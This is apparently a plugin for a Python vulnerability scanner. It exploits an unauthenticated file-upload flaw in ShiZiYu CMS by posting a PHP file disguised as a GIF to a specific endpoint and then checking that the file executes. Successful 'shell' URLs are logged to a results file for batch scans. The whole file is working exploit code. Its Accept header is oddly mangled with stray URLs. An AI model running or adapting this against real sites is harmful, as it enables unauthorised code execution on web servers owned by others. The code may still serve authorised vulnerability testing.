#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import json
import urllib3
import requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
urllib3.disable_warnings()

class ShiZiYuShell2Scan:

    def run(self, urls):
        headers = {
            'Host': urls.split("://")[-1],
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'Origin': 'null',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/avif,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/webp,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Connection': 'close'
        }
        files = {
            'upfile': ('testszy.php', '<?php echo \'hello shiziyucms\'?>', 'image/gif'),
        }
        try:
            response = requests.post(f'{urls}/wxapp.php?controller=Goods.doPageUpload', headers=headers, files=files,verify=self.ssl, timeout=self.timeout,
                                             proxies=self.proxy)
            if response.status_code == 200:
                res_json = json.loads(response.text)
                if res_json['code'] == 0 or res_json['image_thumb']:
                    OutPrintInfo("ShiZiYu", '[b bright_red]文件上传成功')
                    OutPrintInfo("ShiZiYu", f"响应地址 {res_json['image_thumb']}")
                    response2 = requests.get(f"{res_json['image_thumb']}", headers={"User-Agent":self.headers}, verify=self.ssl, timeout=self.timeout,
                                             proxies=self.proxy)
                    if "shiziyucms" in response2.text:
                        if not self.batch:
                            OutPrintInfoSuc("ShiZiYu", '成功获取到Shell文件')
                            OutPrintInfo("ShiZiYu", f"Shell {res_json['image_thumb']}")
                        else:
                            OutPrintInfoSuc("ShiZiYu", f"成功获取到Shell文件 {res_json['image_thumb']}")
                            with open("./result/shiziyu_shell.txt","a") as w:
                                w.write(f"{res_json['image_thumb']}\n")
                    else:
                        if not self.batch:
                            OutPrintInfo("ShiZiYu", "没有获取到shell文件,建议手动复查")
                else:
                    if not self.batch:
                        OutPrintInfo("ShiZiYu", '不存在狮子鱼文件上传')
            else:
                if not self.batch:
                    OutPrintInfo("ShiZiYu", '不存在狮子鱼文件上传')
        except Exception:
            if not self.batch:
                OutPrintInfo("ShiZiYu", '不存在狮子鱼文件上传')

    def main(self, target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        self.headers = target["header"]
        proxy = target["proxy"]
        self.timeout = int(target["timeout"])
        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("ShiZiYu", '开始执行狮子鱼文件上传检测')
        self.run(url)

        if not self.batch:
            OutPrintInfo("ShiZiYu", '狮子鱼文件上传检测执行结束')
